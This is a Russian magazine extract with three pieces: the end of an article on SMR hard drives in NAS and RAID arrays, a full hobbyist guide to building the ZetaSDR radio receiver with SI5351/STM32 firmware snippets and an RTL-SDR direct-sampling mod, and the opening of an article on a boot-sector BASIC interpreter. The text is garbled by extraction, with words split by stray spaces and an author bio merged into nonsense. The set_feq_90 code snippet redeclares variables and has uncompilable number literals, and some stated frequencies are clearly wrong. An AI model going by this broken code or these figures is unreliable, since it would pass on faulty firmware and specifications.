и ряд ограничений; в час тности, Trim не работа ет в массивах RAID 5/6. Ана‐
логичные ограничения есть и у дру гих NAS.
  А это приводит нас к очевидному выводу: даже поддержка накопи телями
команды Trim не делает новые диски Western Digital с черепичной записью
SMR пригодными для использования в сос таве массивов RAID 5 и RAID 6 (а
также, по опыту поль зователей, в составе мас сивов SHR 1 и, возможно, SHR
2). В составе таких массивов непрерывная череда мел коблочных операций
записи быстро (в течение сорока минут) перена сытит контрол лер и перепол‐
нит ограниченный буфер CMR.
   Нельзя и исполь зовать диск с SMR совмес тно с классическими в одном
массиве: в зависимости от нагрузки диск с SMR может замедлить работу все‐
го массива и даже привести к его деградации, если контрол леру покажется,
что диск слишком дол го не отвечает.
  С другой стороны, новые диски WD с черепичной записью вполне допус‐
тимо использовать в однодисковых NAS, а также в сос таве мас сивов уровней
JBOD, RAID 1 или RAID 0 в многодисковых сетевых накопителях, при чем пос‐
ледние два (RAID 1/0) при усло вии, что все диски в составе массива исполь‐
зуют одинаковую технологию записи (только CMR или только SMR).
  И разумеется, диски WD с черепичной записью отлично работают в качес‐
тве архивных. Правда, до тех пор, пока ты используешь их совместно с Win‐
dows, а сам накопитель отформа тирован в NTFS. Использование таких дис‐
ков в macOS способ но преподнести неприятные сюрпризы из‐за особен‐
ностей реализации Trim в ОС от Apple.
  При этом использование диска SMR с поддержкой команды Trim пред‐
почтительнее аналогич ного диска без поддержки Trim — обширный список,
в который входят практически все «домашние» накопи тели Seagate.


СТОИТ ЛИ ПОКУПАТЬ ДИСКИ С SMR
Разница в цене между наполненным гелием накопителем WD My Book или WD
Elements Desktop 8TB, использующими клас сическую запись CMR, и черепич‐
ными Seagate Backup Plus Hub или Seagate Expansion Desktop 8TB на сегодня
порядка 10–15 евро. Раз ница в цене меж ду WD Red 6TB с PMR (модель
WD60EFRX) и SMR (WD60EFAX) — исторически те же 10 евро, но на фоне
последних публикаций ценник на клас сическую модель рез ко и необоснован‐
но взлетел, догнав ценник на 8‐гигабай тный накопи тель.
   Стоит ли переплатить за отсутствие SMR и всегда ли это воз можно?
В некоторых компактных (2,5") накопителях емкостью от 2 Тбайт используют
SMR для того, чтобы получить более тонкий корпус. В компактных дис ках
емкостью в 5 Тбайт SMR используют просто для того, чтобы сделать такую
емкость возможной. А вот дес ктопные диски емкостью 2, 4, 6 и 8 Тбайт впол‐
не можно сде лать и без SMR. Использование черепичной записи позволяет
производителю сэконо мить; часть этой экономии достается на долю покупа‐
теля, но большую часть денег производитель кла дет в собственный карман.
  Решать, купить тот или иной диск, в любом слу чае тебе. Есть сценарии
использования, в которых использование SMR недопустимо в принципе, —
это массивы RAID 5 и 6. Использовать SMR в сос таве массивов RAID 0 и RAID
1 — развле чение на любителя, но при соблюдении простого правила —
использовать в рамках мас сива диски только без CMR или только с SMR —
это возможно, хоть и не оптимально. В одно дис ковом NAS, который умеет
использовать Trim, ты не заметишь большой разницы между диском с PMR
и диском SMR, поддерживающим команду Trim. Наконец, дис ки с SMR и Trim
вполне допустимо использовать в качестве архивных.
  А вот за использование дисков с SMR, но без под держки Trim произво‐
дитель просто обязан давать гигантскую скидку. В противном случае мне
сложно понять потребителя, приобретающего себе заведомо медленный
(очень медленный) и нестабильный по ско рости работы накопитель.


ЗАКЛЮЧЕНИЕ
В этой статье мы подробно рас смот рели как саму черепичную технологию
записи SMR, так и особенности ее реализации двумя крупнейшими пред ста‐
вителями индустрии — компаниями Seagate и Western Digital.
  Является ли SMR абсолютным злом?
   Нет, не является — если покупа тель понимает, какие проблемы и огра‐
ничения он приобретает за свои деньги, и получает за это достаточную скид‐
ку. Но делать это нужно с открытыми глазами, а сознательно утаивать
информацию совершенно недопус тимо. Сейчас компания Western  Digital,
кажется, отделалась легким испугом. Мне очень хотелось бы увидеть кол‐
лективный иск, гигантский штраф и соответству ющую компенсацию, вып‐
лаченную производите лем за годы обмана и умолчаний.
  Запасусь поп корном и продолжу отслеживать ситуацию.
ТРЮКИ

ZETASDR





                                         Candidum
                                                duospirit@gmail.com


            СОБИРАЕМ
    ПРОГРАММНО ОПРЕДЕЛЯЕМЫЙ
         РАДИОПРИЕМНИК
         СВОИМИ РУКАМИ





SDR (Software Deﬁned Radio) — это програм мно определя‐
емая радиосис тема, где софт преобра зует ради осиг нал
в цифровой вид. Это открывает широчай шие возможности
для анализа сигнала. Появ ление все более доступных сис‐
тем SDR стало дивным подарком радиолюбителям. В этой
статье мы разберемся, как работа ет SDR, самым надежным
методом — соз дав собственный приемник. И при этом пос‐
тараемся не утонуть в пучине матана лиза.


Один из самых популярных SDR сегодня — это китай ский «свисток» RTL‐SDR,
мы о нем неоднократно писали (можешь посмотреть, например, статью «Де‐
лаем первые шаги с RTL‐SDR»). Он обладает просто фантастическими воз‐
можностями для своей цены.
   Схема RTL2832 + RT820 выглядит вот так.





Сигнал поступает на вход радиотракта, реализованного на RT820, где выпол‐
няется первое преобразова ние частоты в промежу точную, здесь 3,57 МГц.
Зеркальный канал при этом подавляется фильтрами, насколько это воз‐
можно.
   Такое решение позволя ет покрыть огромный диапазон частот от несколь‐
ких десятков мегагерц до пары гигагерц. Не весь сразу, конечно, а только
кусочками по несколько мегагерц (судя по документации, RTL2832 способен
оцифровать и сигнал частотой в несколько десятков мегагерц, однако упи‐
рается в пропускную спо собность USB). На самом деле зачас тую достаточно
и этого.
  Полученный сигнал ПЧ оцифровывается в RTL2832, пос ле чего под верга‐
ется второму программно му преобразова нию частоты. Здесь уже исполь‐
зуется квадратурный гетеро дин, реализованный программно как скалярное
произведение входящего сигнала на опорный. А в случае квадратурного
гетеродина в качестве опорных использованы два сигнала с одной и той же
частотой, но сдвинутые по фазе на π/2. На выходе смесителей стоят фильтры
низкой частоты, которые фильтру ют сигнал с удво енной опорной час тотой.
В результате на выходе тоже имеем два сигнала: синфазный (I) и квадратур‐
ный (Q). Впрочем, названия до некоторой степени условны.





Сигналы  в  виде  потока  данных  передаются  по  USB.  Собственно,
перед отправкой и происходит ресемплирование, когда скорость передачи
понижается до пример но 2 Мвыб/с, в данной схеме это «бутылочное гор‐
лышко». Почему именно квадратурный гетеродин? Из теории цифровой
обработки сигналов известно, что, имея только сигналы I и Q, можно декоди‐
ровать сигнал с любым из существующих способов модуляции. Например,
АМ‐модуляция, на которой мы ниже и сосредоточимся, реализуется наибо‐
лее просто.
   Если представить, что I — это действи тельная часть, а Q — мнимая часть
комплексного сигнала Z, то |Z| = (I^2 + Q^2)^1/2 и есть искомый демоду‐
лированный сигнал. C ЧМ и ФМ уже будет слож нее, но не принципиально.
Впрочем, теория цифровой обработки сигналов слишком тяжела, чтобы
пересказывать ее в двух словах, — при желании можешь почитать под робнее
сам.
   Дальше сигнал обрабатывает уже компь ютер, где из отдельных семплов I
и Q формируется комплексный семпл Z = I + jQ. Однако, как ты понима‐
ешь, это тоже некото рая условность, поз воляющая применить математичес‐
кий аппарат ком плексно го исчисления к сигналу.
  По существу, все это реализуется такими программными пакетами,
как SDR# (Windows), gqrx (Linux) или GNU radio (Linux). Последний нам наибо‐
лее интересен, так как поз воляет не только пробежаться по диапазону, но и
понять, как программная часть реализована внутри. И при этом вовсе не нуж‐
но залезать в дебри программирова ния, а мож но при помощи мыши сос‐
тавить структурную схему (граф) из отдельных блоков. Блоки обычно реали‐
зуют одну операцию (в лучших традициях Unix). Вот так в GNU Radio выглядит
простейший FM‐приемник на RTL‐SDR, соз данный за пару минут.





                      Простейший пример

RTL‐SDR выступает в роли источника, выда ющего поток комплексных Z‐зна‐
чений, что равносильно обо им потокам I и Q. Далее сигнал попадает в циф‐
ровой фильтр низких час тот ФНЧ, который вырезает интересующую нас
полосу. Так как в данном случае ожидается частотная модуляция, то нам пот‐
ребуется полоса в ~200 кГц, с центром в нуле, которому соответству ет выс‐
тавленная на RTL‐SDR частота. Далее сигнал попадает на частотный детек‐
тор, на выходе которого получа ется реальный зву ковой сигнал, подходящий
для звуковой карты. Ресемплер нужен, чтобы сог ласовать битрейт сигнала.
Итого — половина приемника всего в нес колько кликов мышки!


SIMPLE SDR
Раньше  относительной  популярностью  пользовались  SDR‐приемники,
которые использовали звуковую карту компь ютера в качес тве АЦП. Боль‐
шинство имели схожую конструкцию и сос тояли из опорного генератора,
фазовращателя, смесителя и усилителя низкой частоты. Выход уси лителя
подклю чался к линейному входу звуковой карты. Чувствуешь аналогию с рас‐
смотренным выше RTL2832? Суть та же, только про межу точная частота тут
ниже и оцифровывается уже квадратурный сигнал.
   Рассмотрим схему популярного приемника ZetaSDR.





                         Схема ZetaSDR

Сигнал с тактового генератора частотой F идет к фазовращателю, выпол‐
ненному на двух D‐триггерах, соединенных в счет чик Дженсона. Тот пред‐
ставляет собой сдвиговый регистр, последний инвертированный выход
которого подан на вход. При подаче тактового сигнала по выходам сдвигово‐
го регистра будет распространять ся попеременно волна нулей и еди ниц.
В нашем случае на выходах Q0 и Q1 будут последовательно устанавливаться
состояния 00, 01, 11, 10, что в десятичной сис теме соответствует 0, 1, 3, 2.
С точки зрения сигналов это два меандра частотой F/4, сдви нутые по фазе
на 90°.





             Диаграмма сигналов на счетчике Дженсона

Далее полученные опор ные сигналы поступа ют на ключевой смеситель Дэна
Тейло (Dan Tayloe), выполненный на мультиплексоре 74HC4052. Смеситель
умножает один сигнал на дру гой, поэто му если один из сигналов — меандр,
то умножение сводится к простому переключению.





                 Принцип работы смесителя Тей ло

На приведенной ниже картинке показана диаграмма работы мультиплексора,
где вклю ченному каналу условно соответс твует высокий уровень на нем.





                      Работа мультиплексора

Принимая канал X0 за 0°, видим, что 90° — это X1, 180° — X3, а 270° — X4.
Соответствующим  обра зом  подклю чены  и  операционные  усилители.
В результате на выходе получа ем сигналы  I и Q, сме щенные на 90°. Под‐
робнее о смесителе Тейло можно прочитать в оригинальной статье. Далее
сигналы отправляются на линейный вход аудиокарты.


СИНТЕЗАТОР
В ZetaSDR применен неперес траиваемый генера тор, что дает полосу при‐
ема, равную полосе пропус кания аудиокарты вокруг F/4. Думаю, ты сог‐
ласишься, что это не очень мно го, так как любая аудиокарта редко имеет
полосу пропускания больше 200 кГц. С дру гой сто роны, ZetaSDR разрабаты‐
вал ся как приемник наблюдателя, и там полоса в 200 кГц перекрывает весь
любительский диапазон на 40  м. Но мы‐то хотим охватить несколько
КВ‐диапазонов! Кроме того, за пос ледние десять лет стало гораздо проще
с синтезаторами.
  Поэтому  восполь зуемся микросхемой  SI5351,  которая  представляет
собой синтезатор частоты с цифровым интерфейсом, способный вых‐
ватывать несколько сигналов с час тотой от 8 кГц до 160 мГц. При этом
из обвязки требует лишь кварц и два подтягивающих резистора для I2C —
все, как ты любишь. Для совсем уж ленивых людей в китайских онлайновых
магазинах продавцы предлагают и вовсе соб ранные модули на этой мик‐
росхеме, что очень удобно для макетирова ния.
  В качестве микроконтроллера я взял STM32F103C8T6, весьма популярный
сегодня среди радиолюбителей благодаря пла те Bluepill. Собираем макет
на Bluepill и модуле SI5351, а в качес тве интерфейсов используем I2C OLED‐
дисплей и энкодер. В итоге получается такая схема.





Для управления SI5351 я использовал биб лиотеку STM32‐SI5351, которая
представ ляет собой порт на С ана логичной биб лиотеки для Arduino на Wiring.
Так как она использует код на HAL, а я уже силь но привык к функциям Li‐
bOpenCM3, ее исходники пришлось чуть поп равить. В основном изменения
коснулись функций отправки и чтения данных. Кроме того, в заголовочном
файле перед приватными переменными пришлось добавить модификатор
static, иначе оно не хотело собираться.
  В итоге адаптированные функции приняли следующий вид:


/** Write multiple bytes
 * @param regAddr Register address to write to
 * @param length Count Bytes
 * @param data Value to write
 * @return Status of operation (true = success)
 */
uint8_t si5351_write_bulk(uint8_t regAddr, uint8_t length, uint8_t *
data) {
  uint8_t temp[255];
  temp[0] = regAddr;
  memcpy(temp+1,data, length);
  i2c_transfer7(SI5351_I2C, SI5351_BUS_BASE_ADDR, temp, length + 1, 0
, 0);
  return 1;
}


/** Write single byte to an 8‐bit device register.
 * @param regAddr Register address to write to
 * @param data New word value to write
 * @return Status of operation (true = success)
 */
uint8_t si5351_write(uint8_t regAddr, uint8_t data) {
  uint8_t temp[2];
  temp[0] = regAddr;
  temp[1] = data;
  i2c_transfer7(SI5351_I2C,SI5351_BUS_BASE_ADDR, temp, 2, 0, 0);
  return 1;
}


uint8_t si5351_read(uint8_t regAddr) {
  uint8_t reg_val = 0;
  i2c_transfer7(SI5351_I2C,SI5351_BUS_BASE_ADDR, &regAddr, 1, &
reg_val, 1);
  return reg_val;
}

Из‐за расхождений в обработке данных при переда че по I2C между HAL и Li‐
bOpenCM3 функция si5351_write_bulk() получи лась несколько сложной.
Но, учитывая небольшой объем данных, переда ваемых в SI5351, я решил, что
спускаться на уровень ниже и писать свой ана лог для i2c_transfer7() ради
всего этого не стоит. А вот с заголо вочным файлом пришлось поковыряться
дольше. Для запуска син тезатора необ ходимо инициализировать SI5351,
вклю чить соответствующий порт и задать частоту.


si5351_init(SI5351_CRYSTAL_LOAD_10PF, 25005500, 0);
si5351_drive_strength(SI5351_CLK0, SI5351_DRIVE_8MA);
si5351_set_freq(freq_khz * 100000ULL, SI5351_CLK0);

Частота задается в si5351_set_freq() в сотых долях герца, поэтому зна‐
чение в килогер цах умножается на константу. Также крайне желательно ука‐
зать тип констан ты — ULL (uint64). Микросхема может не только просто син‐
тезировать произвольную час тоту, но и генерировать несколько сигналов
с заданным сдвигом фаз. Была реализова на функция, генерирующая два
опорных сигнала со сдвигом фаз в 90°.


void set_feq_90(uint64_t freq) {
  uint8_t coef = 650000000 / freq;
  uint64_t pll_freq=coef * freq;


  // We will output 14.1 MHz on CLK0 and CLK1.
  // A PLLA frequency of 705 MHz was chosen to give an even
  // divisor by 14.1 MHz.
  unsigned long long freq = 14100000 00ULL;
  unsigned long long pll_freq = 705000000 00ULL;


  // Set CLK0 and CLK1 to output 14.1 MHz with a fixed PLL frequency
  set_freq_manual(freq*100, pll_freq*100, SI5351_CLK0);
  set_freq_manual(freq*100, pll_freq*100, SI5351_CLK1);


  // Now we can set CLK1 to have a 90 deg phase shift by entering
  // 50 in the CLK1 phase register, since the ratio of the PLL to
  // the clock frequency is 50.
  set_phase(SI5351_CLK0, 0);
  set_phase(SI5351_CLK1, coef);


  // We need to reset the PLL before they will be in phase alignment
  pll_reset(SI5351_PLLA);
}

Сначала я использовал именно эту функцию, и первый макет приемника
не имел фазовращателя. Однако применение локального фазовращателя
на 74AC74 дало лучший результат, поэтому от генерации двух сигналов я
отказал ся (хотя этот вариант тоже ока зался рабочим).
  В качестве дисплея здесь применен OLED‐экран на SSD1306, для него
была написана библиотека, которая осуществляет форматный текстовый
вывод и ограниченно поддерживает юникод, примерно как в моем проекте
MP3‐плеера, о котором я писал ранее. Нас тоящей засадой стал энкодер.
С виду это очень удоб ная вещь для перестройки. Однако дешевый контак‐
тный энкодер стал быстро сбо ить, и пользовать ся им стало невозможно.
А хотелось, чтобы ему сносу не было, как в Bruker AC200. И решение наш‐
лось!
  По сути, энкодер легко можно сделать из шагового двигате ля, а у меня
как раз завалялся один такой от принтера. Поэтому, вдохновившись од ной
публикацией и слегка адаптировав схему под имевшиеся у меня в наличии
HEF4011 (К561ЛА7), я собрал вот такую конструкцию. Здесь собранные
на инверторах триггеры Шмитта формиру ют цифровой выход.





Алгоритм дешифровки сигнала энкодера великолепно прост. По восходяще‐
му фронту одного из выходов энкодера случается пре рывание, в котором
определяется уровень на втором выходе. Если там ноль, то считаем, что
энкодер вращается вперед, а если единица, то назад. Это отражено на гра‐
фике.





Видим, что и здесь у нас квадратурные сигналы: в одном слу чае фаза отстает
на 90°, а в другом опережает.





С  контактным  энкодером  такой  алгоритм работал без сбоев, однако
с шаговым двигателем в обмотках воз никла проб лема — он делал сразу два
шага. Кроме того, при смене направления первый шаг выполнялся неверно.
Первую проблему я поборол программно, просто пропус кая нечетные пре‐
рывания, а второй баг я в ито ге банально игнорировал. :)


void exti0_isr() {
  static uint8_t n = 0;
  n++;
  if (n % 2) {
    exti_reset_request(EXTI0);
    return;
  }
  if (gpio_get(GPIOA,GPIO1)) {
    if(encoder < MAX_LIMIT ‐ coef) {
      encoder += coef;
    }
  } else {
    if (encoder > MIN_LIMIT + coef) {
      encoder ‐= coef;
    }
  }
  // Флаг прерывания надо сбросить вручную
  exti_reset_request(EXTI0);
}

Лю бопытная особенность: прерывание сра батывает, лишь когда вывод скон‐
фигурирован как ﬂoat input, а когда его задаешь как input pullup/pulldown, оно
не работает (хотя вроде как должно). Кнопками переключается шаг перес‐
тройки  частоты  и  уста навлива ются  зна чения  частот,  соответс твующих
КВ‐диапазонам. Исходники синтезатора, как всегда, дос тупны на GitHub.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
            ZETASDR
          СОБИРАЕМ ПРОГРАММНО ОПРЕДЕЛЯЕМЫЙ
               РАДИОПРИЕМНИК СВОИМИ РУКАМИ





СБОРКА ПРИЕМНИКА
Схема, которую я использовал, отличается от референсной лишь нез‐
начительно.





Сначала приемник и синтезатор были собраны на макетах, причем в первой
версии не было фазовращателя, а оба опорных сигнала генери ровались
в SI5351.





Потом туда добавился фазовращатель (также на соп лях), и, что самое инте‐
ресное,  все  это  работало! Вмес то 74AC74  (K1554ТМ2)  также можно
взять 74HC74 (K555ТМ2), но тог да выше 10 МГц вряд ли удас тся забраться,
так как 74HC74 работает где‐то до 40 МГц. А вот AC‐серия уверенно держит
до 120 МГц.
   Убедившись в работоспособности конструкции, я перенес устройство
на печатные платы, что несколько повысило качество сигнала, особенно пос‐
ле помещения плат в экран. Хотя разница была непринципиальная.
   ВЧ‐сигналы стоит переда вать по коаксиальному кабелю и использовать
при этом соответствующие разъемы, нап ример SMA. На худой конец кабель
можно и запаять. Провод, иду щий к аудиокарте, тоже нужен экранированный.
Необязательно высокочастотный, но неп ременно экранированный, иначе все
утонет в помехах.
  Печатные платы выполнены из двухстороннего фольгированного стек‐
лотекстолита, на тыльной стороне сохранен слой меди и соединен с землей,
перемычки сделаны из изолированного провода, а в месте входа в плату
отверстия раззенкованы.





Сами платы помещены в жестяные корпуса, выполняющие роль экрана.





Энкодер синтезатора вмес те с кнопками переключения диапазонов и изме‐
нения шага настрой ки выведен отдельно.





Вместо NE5532 можно взять LM358, но первая микросхема все же пред‐
почтительнее, так как мень ше шумит. И самый важный момент во всем
деле — антенна. Хорошо бы, конечно, исполь зовать достаточно длинную
наружную антенну и желательно за городом, но за неимением лучшего сой‐
дет и кусок провода, растянутый по ком нате. Особенно если к нему подклю‐
чить П‐образный контур и подстраивать по максимуму сигнала.





Неплохих результатов можно добиться с магнитной антенной. Главное —
при ее использовании будет куда лучше соотношение сигнал/шум, что осо‐
бенно важно в городе.





Сама петля изготовлена из коаксиального кабеля и име ет диаметр 400 мм,
транзистор J309 можно заменить на BF245 или КП303Е. Антенну и предуси‐
литель также можно смонтировать на макетной пла те.





Все это собрано буквально на коленке, из имевшихся дома запасов (чертов
коронавирус!). Места занимает немного, но работает достаточно бодро,
перекрывая диапазон от 5,8 МГц до 19 000 МГц. А если параллельно
переменному конденсатору добавить емкость, то можно уйти и ниже.


ВКЛЮЧАЕМ





Для проверки работоспособности приемник сначала подключаем к осциллог‐
рафу. На синтезаторе выставляем частоту 12 МГц (3 МГц после фазов‐
ращателя), а вместо антенны подключаем генератор  сигнала  (синусо‐
ида 3 МГц размахом 300 мкВ). Если син тезатор настроен правильно, то час‐
тота биений на выходе должна быть несколько герц. Собственно, по генера‐
тору я его и откалибровал, поправив час тоту кварцевого резонатора в про‐
шивке. Кстати, вместо правки частоты можно было в той же функции задать
отклонение в ppm.


si5351_init(SI5351_CRYSTAL_LOAD_10PF, 25005500, 0);

Также видим, что при переходе частоты биений через 0 скачкообразно изме‐
няется сдвиг фаз между I и Q c 90° на –90°. Это значит, что все работает пра‐
вильно. Теперь можно подключать к аудиокарте. Тут подойдет любая со сте‐
реофоническим линейным входом. Ширина полосы пропус кания нас в дан‐
ном случае волнует мало, так как мы всегда можем сдви нуть опорный сигнал.


СОФТ
Есть множество программ для работы с SDR‐приемниками, однако сейчас
все они ориентированы на работу с RTL‐SDR и его более специализирован‐
ными разновидностями, такими как HackRF, airspy и дру гими. Тем не менее
из актуального софта SDR# поддерживает захват с аудиокарты. Это популяр‐
ная программа, и мануалов по ней в Сети полно, хотя интерфейс и так инту‐
итивен.
  Поэтому  устанавливаем, запускаем, выставля ем желаемый диапазон
на синтезаторе, подстра иваем антенну по максимуму сигнала, включаем
АМ‐демодулятор (большая часть всего интересного на КВ именно в АМ) —
и вперед. Работает приемник очень устойчиво, с регенеративными аналога‐
ми (которые до сих пор иногда собирают) при схожей сложности тут по качес‐
тву просто нет никако го сравнения. Конечно, здесь видны и зеркальный
канал, и отражения, особенно отчетливые на мощ ных станциях, но это рас‐
плата за простоту радиотракта. Побороть отра жения можно, использовав
ФНЧ на выходе операционного усилителя. А зеркальность реально подавить,
отбалансировав каналы хотя бы по амплитуде.
   Также для Windows есть совсем минималис тичная и несколько устаревшая
программа SDRadio, которая поддержи вает и наш приемник. Впрочем, упо‐
мянуть ее стоило скорее ради рет роспективы.
   Хорошо, а что в Linux? Тут чуть слож нее: gqrx ориентирована только
на работу с чипами RTL и не поддерживает захват с аудиокарты. Так что вос‐
пользуемся GNU Radio!
  Запускаем gnuradio‐companion и строим несложный граф. В качестве
источника используем audio  source, в свой ствах которого выставляем
количество выходов (2) и sample rate=48000. Такие настройки любая ауди‐
окарта потянет. Когда количество выходов audio source указано как два,
автоматически используют ся левый и правый каналы захвата.
  При необходимости можно выб рать одну из нескольких аудиокарт. Даль‐
ше ставим блок float to complex, который из двух реальных значений соз‐
дает одно комплексное, к его входам подклю чаем наш источник. Также
полезно между audio source и float to complex поставить умножение
на константу, что позволит отбалансировать каналы по амплитуде. Теперь
ставим фильтр низких частот, в котором указыва ем частоту среза 5 кГц.
Фильтр выделит необ ходимую нам полосу сигнала 5 кГц вокруг нуля.
   Очень полезная функция GNU  Radio —  воз можность использовать
переменные, значения которых зада ются отдельно, или и вовсе изменять
интерактивно с помощью элементов интерфейса. К выходу фильтра подклю‐
чаем АМ‐демодулятор, который находит модуль комплексного сигнала, и Au‐
dio Sink. А так как в данном случае sample rate источника и приемника рав‐
ны, то согласовывать их ресемплингом нам не нужно. Простей ший AM‐при‐
емник готов!
  Он принимает станцию на час тоте гетеродина, то есть в центре полосы,
попадающей на аудиокарту. Хорошо, а как пос мотреть спектр сигнала?
Для этого добавляем элемент QT GUI: Frequency Sink, который отрисует
нам спектр сигнала. Подключать его сто ит к выходу блока float to complex.
Похожим образом элемент QT GUI: Waterfall Sink отвечает за «водопад».
   Как будто все хорошо в нашем приемнике. Вот только нет программной
перестройки частоты в окне, а это крайне полез ная штука, учитывая, что ауди‐
окарты часто дают артефакты в разных час тях окна. Моя вот, например, в нуле
(+/–100 Гц): судя по всему, это наводки от электросети мешают приему сиг‐
нала.
  Сделать программную перестройку достаточно просто, надо добавить
еще один блок умножения между float to complex и Low Pass Filter,
но в данном случае не на константу, а на функцию, то есть на второй сигнал.
В качестве источника второго сигнала возьмем блок Signal Source, фор ма
сигнала — косинус. Его частота должна быть равна той частоте, на которую
необходимо сдвинуть сигнал.
   Таким образом, мы добавили в приемник еще один преобразователь час‐
тоты, на этот раз уже программный. Теперь, перестраивая частоту Signal
Source, мы можем выбирать, какую часть окна отправить на детектор. Иными
словами, мы просто сдвигаем ноль в нашем окне. Полученный граф приемни‐
ка выглядит как на схеме.





Если хочется послушать радиолюбителей — никаких проблем, только вмес то
модуля сигнала нам теперь нужна его действительная часть (или мнимая,
или их сумма, тут непринципиально). Был при емник АМ, а стал прямого пре‐
образования! Тут, конечно, стоит поправить полосу пропускания фильтра, так
как мы уже на SSB. Лучше выставить где‐нибудь 1500 Гц.





На 40 м хорошо слышны радиолюбители. А вот так выглядит уве ренный при ем
в режиме АМ «Международного радио Китая», которое здорово слышно
во всех вещательных КВ‐диапазонах.





БОНУС
Хорошо, но что делать, если в ноутбуке нет аудиокарты, а поползать
по КВ‐диапазону очень хочется? Можно, конечно, купить внешнюю аудиокар‐
ту или конвертер к RTL‐SDR, но повышающий конвертер стоит в разы дороже
самого RTL‐свистка. Также в Китае продают модифицированные RTL‐SDR v3,
которые поддерживают direct conversion: цена приемлема, но все равно
заметно выше, чем у RTL‐SDR. Да и зачем покупать, когда девайс можно хак‐
нуть.


           WARNING

                    Описанные манипуляции могут испортить твой
                      RTL‐SDR,  а  при  неблагоп риятном  сте чении
                       обстоятельств выжечь порт USB и даже спа лить
                      материнскую плату. Поэтому повторяй эти дей‐
                        ствия на свой страх и риск и лишь в том случае,
                       если точно знаешь, что делаешь. Я предупредил!


Как ты знаешь, RTL2832U имеет на входе АЦП. Более того, если прочитать
импровизированный да ташит, написанный энту зиастами, можно увидеть, что
этих АЦП два и у обоих дифференциальный вход. При этом чип может оциф‐
ровать сигнал вплоть до 30 МГц. По сути, все, что надо, — это подать сигнал
на вход, можно даже на один. В простейшем случае так и делают: выпаивают
чип преобразователя час тоты и припаивают антенну. Причем иногда чип
даже оставляют на месте, просто перерезая соот ветс твующие дорожки.
  Но мы используем более элегантное решение. Если ты, выбирая свисток,
следовал рекомендациям, то наверняка в качес тве пре образователя там
используется чип RT820 — и действитель но, в нашем слу чае он более удо‐
бен. Дело в том, что RT820 использует только один вход  I микросхе мы
RTL2832U (это выводы 1 и 2), а вход Q (выводы 4 и 5) остается незадейство‐
ванным.
   Вот именно к ним мы и подключимся. Более того, допол нительно можно
воспользоваться трансформатором, что поз волит задействовать дифферен‐
циальность входа, защитит от статики и несколько согласу ет сопротивления.
Впрочем, с последним мы замора чивать ся не будем. А вот защита от статики
гораздо важнее, иначе в один неожиданный и не самый при ятный момент
девайс может превратиться в кирпич. Трансформатор мотается на фер‐
ритовом кольце тремя сло женными вмес те про вода ми и содержит шесть вит‐
ков, обмотки фазируются, как ука зано на схеме.





В принципе, даже мотать трансформатор необя зательно, можно исполь‐
зовать готовый, например из ADSL‐модема. Все в этой модификации
хорошо, раз ве что шаг у RTL2832U 0,5 мм и выводы очень короткие. Так что
припаять к самим контактам МГТФ 0,05 у меня не вышло. Вместо этого я под‐
паял к ним провод 0,1 мм, а уже к нему — выводы трансформатора. Чтобы вся
эта конструкция держалась и не шевелилась, я использовал термоскотч.





Эта модификация, конечно, требует определенных навыков, но все впол не
реально (у меня ушло на это около получа са). Запускаем gqrx с параметрами
устройства rtl=0,direct_samp=2 и видим, что все прекрасно работает
(будем оптимистами). Подклю чаем рамочную антенну, и можно слушать
эфир. Параметр direct_samp=2 ука зывает на то, что надо использовать пря‐
мую оцифровку сигнала со входа Q. Кроме того, основная функци ональность
устройства по‐прежнему присутству ет и запуск со стандартными парамет‐
рами позволяет принимать УКВ.
  Конечно, у такого простого решения есть и недостатки в виде наводок
от FM‐станций, ложных сигналов и прочих прелестей, но работает оно срав‐
нимо с RTL‐SDR v3. А если очень хочется, то устройство можно попробовать
прокачать и дальше. Но это, на мой взгляд, излишне, раз ве что входной филь‐
тр с частотой среза около 30 МГц и хороший, экра нированный корпус точно
еще никому не мешали. :)
КОДИНГ
МИКРОБ





   ПИШЕМ БЕЙСИК НА АССЕМБЛЕРЕ
       И УМЕЩАЕМ В 512 БАЙТ





Хочешь   попрактиковаться   в   кодин ге
на  ассемблере?  Давай  вместе  шаг
за шагом соз дадим интерпретатор бейсика
и запустим его прямо из загрузочного сек‐
тора твоего компьютера. Для это го придет‐           Антон Карев                                                                                    Эксперт по информационной
ся задействовать перекрывающиеся под‐         безопасности.профессиональныхОбласть
программы  с  разветвленной  рекурсией,      интересовразведка, аналитика— технологическаяв сфере
иначе бейсик не уместится в 512 байт. Ско‐        ИБ и интеллектискусственный
                                                                                              vedacoder@mail.ru
рее всего, это будет самая сложная прог‐
рамма в твоей жизни. Когда ты создашь ее
своими  руками, сможешь без  зазрения
совести называть себя хакером.


             INFO

                  С месяц назад  я рассказывал,  как  написать
                       игрушку  FloppyBird,  которая  тоже  умещалась
                        в бутсектор. Но по сравнению с тем, что мы
                        с тобой сот ворим сейчас, она покажется тебе
                     мелкой шалостью.



КАК ПОЛЬЗОВАТЬСЯ ИНТЕРПРЕТАТОРОМ
По сути, написав бейсик для бутсекто ра, мы превратим твой ПК в аналог ста‐
рых домашних компьютеров типа Commodore 64 или ZX Spectrum, которые
имели этот язык в ПЗУ и поз воляли программировать на нем сразу после заг‐
рузки.
   Техническое задание (что будет уметь наш интерпретатор) я сформулирую
в виде инструкции поль зователя. Вот она.
  Интерпретатор работает в двух режимах: интерактивном и обычном.
В интерактивном режиме он выполняет команды сра зу пос ле ввода.





В обычном режиме сначала надо занес ти исходник программы в память
и затем дать команду run.





Если нужно удалить строку из исходника, прос то введи в командной строке ее
номер.





Как интерпретатор узна ёт, в каком режиме обра баты вать текст из командной
строки? Если строка начина ется с номера, интерпретатор обрабаты вает ее
в обычном режиме. Если не с номера — в интерактивном.
  Максимальный размер программы — 999 строчек. Максимальная длина
строки — 19 символов. Обра ти внимание, что кла виша Backspace функци‐
онирует как надо. Хоть на экра не символ и не затирается, в буфере все
в порядке.
  В распоряжении у программиста:
 • три команды: run  (запус кает  прог рамму), list  (выводит  исходник
   на экран), new (стирает программу);
 • 26 переменных (от a до z): двухбайтовые целые чис ла без знака;
 • выраже ния, которые могут включать в себя: чис ла, четыре арифметичес‐
   кие операции, скоб ки, переменные;
 • три оператора: if , goto, = ;
 • две функции: print, input.

Вот языковые конструкции, которые понимает наш интерпретатор:
 • var=expr присваивает значение expr переменной var (от a до z);
 • print expr выводит зна чение expr и переводит курсор на следующую
   строку;
 • print expr; выводит значение expr и оставляет курсор на текущей
   строке;
 • print "][ello" печата ет строку и переводит курсор на следующую
   строку;
